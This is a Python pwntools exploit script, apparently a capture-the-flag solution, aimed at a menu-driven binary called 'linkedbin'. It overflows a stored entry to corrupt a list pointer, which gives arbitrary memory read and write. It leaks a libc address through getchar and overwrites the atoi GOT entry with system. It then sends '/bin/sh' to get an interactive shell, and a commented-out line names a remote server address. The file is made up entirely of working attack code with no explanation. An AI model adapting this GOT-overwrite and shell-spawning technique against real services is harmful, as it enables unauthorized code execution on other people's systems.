#!/usr/bin/python

from pwn import *

def insert(ID,payload):
	r.sendlineafter(">> ",'1')
	r.sendlineafter("ID: ",str(ID))
	r.sendlineafter("tent: ",payload)

def edit(ID,payload):
	r.sendlineafter(">> ",'2')
	r.sendlineafter("ID: ",str(ID))
	r.sendlineafter("tent: ",payload)

def view(ID):
	r.sendlineafter(">> ",'3')
	r.sendlineafter("ID: ",str(ID))
	r.recvuntil("Content: ")
	return r.recvline(False)

def delete(ID):
	r.sendlineafter(">> ",'4')
	r.sendlineafter("ID: ",str(ID))

def exploit():
	insert(1,"a")
	insert(2,"b")
	insert(3,"c")

	payload = 'a'*0x40
	payload += p64(0)
	payload += p64(0x602090-0x40)
	edit(2,payload)

	r.sendlineafter(">> ",'999')
	for i in xrange(3): r.recvuntil("Content: ")

	libc_leak = u64(r.recvline(False).ljust(8,'\x00'))
	libc.address = libc_leak - libc.symbols["getchar"]
	log.info("getchar: {}".format(hex(libc_leak)))
	log.info("libc base: {}".format(hex(libc.address)))
	log.info("system: {}".format(hex(libc.symbols["system"])))

	payload = 'a'*0x40
	payload += p64(0)
	payload += p64(exe.got["atoi"]-0x10)
	edit(2,payload)

	payload = p64(libc.symbols["setvbuf"])
	payload += p64(libc.symbols["system"])
	edit(libc.symbols["getchar"],payload)
	r.sendlineafter(">> ","/bin/sh")
	r.interactive()

context.terminal = ["/mnt/d/wsl-terminal-tabbed/open-wsl.exe","-e"]
exe = ELF("./linkedbin")
# libc = exe.libc
libc = ELF("libc-2.27.so")

if len(sys.argv) < 2:
	r = gdb.debug([exe.path],gdbscript="""
		b *0x400b16
		c
	""")
else:
	# r = remote("128.199.211.118",23338)
	r = remote("localhost",23338)

exploit()